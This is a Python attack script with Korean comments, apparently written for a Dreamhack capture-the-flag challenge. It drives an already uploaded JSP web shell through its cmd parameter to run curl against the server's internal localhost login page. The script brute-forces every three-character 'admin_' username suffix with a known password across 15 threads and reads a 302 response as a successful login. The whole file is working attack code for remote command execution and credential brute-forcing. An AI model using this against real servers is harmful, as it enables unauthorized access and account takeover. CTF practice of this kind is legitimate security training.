import requests
import string
import itertools
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# ================= 설정 구간 =================
# 1. 웹쉘 주소 (이미 확보하신 그 주소!)
WEBSHELL_URL = "http://host3.dreamhack.games:16324/uploads/shell.jsp"
# 2. 이미지에서 찾은 최신 비밀번호
PASSWORD = "6cq62SMc2lxRbW8R" 
# 3. 로그인 시도할 내부 주소 (서버 입장에서 자기 자신)
INTERNAL_LOGIN_URL = "http://localhost:8080/login" 
# ============================================

chars = string.ascii_lowercase + string.digits
combinations = ["".join(combo) for combo in itertools.product(chars, repeat=3)]
total = len(combinations)

found_id = None
counter = 0
lock = Lock()

def attempt_login(suffix):
    global found_id, counter
    if found_id: return

    user_id = f"admin_{suffix}"
    # curl의 -w "%{http_code}" 옵션을 써서 상태 코드만 깔끔하게 받아옵니다.
    cmd = f'curl -s -o /dev/null -w "%{{http_code}}" -d "userId={user_id}&password={PASSWORD}" {INTERNAL_LOGIN_URL}'
    
    try:
        response = requests.get(f"{WEBSHELL_URL}?cmd={cmd}", timeout=5)
        status_code = response.text.strip()

        # 상태 코드가 302(리다이렉트)이면 로그인 성공입니다.
        if "302" in status_code:
            with lock:
                if not found_id:
                    found_id = user_id
                    print(f"\n\n[★] 성공! 아이디 찾음: {found_id}")
            return

    except Exception:
        pass
    finally:
        with lock:
            counter += 1
            # 20개마다 진행 상황을 한 줄에 갱신하며 출력합니다.
            if counter % 20 == 0 or counter == total:
                print(f"[*] 진행률: {counter}/{total} | 시도 중: {user_id}   ", end="\r")

print(f"🚀 웹쉘 릴레이 공격 시작! (PW: {PASSWORD})")

# 서버 내부 통신이므로 스레드를 15~20 정도로 유지하는 게 안정적입니다.
with ThreadPoolExecutor(max_workers=15) as executor:
    executor.map(attempt_login, combinations)

if not found_id:
    print("\n\n[-] 모든 조합을 시도했지만 찾지 못했습니다. PW나 URL을 확인하세요.")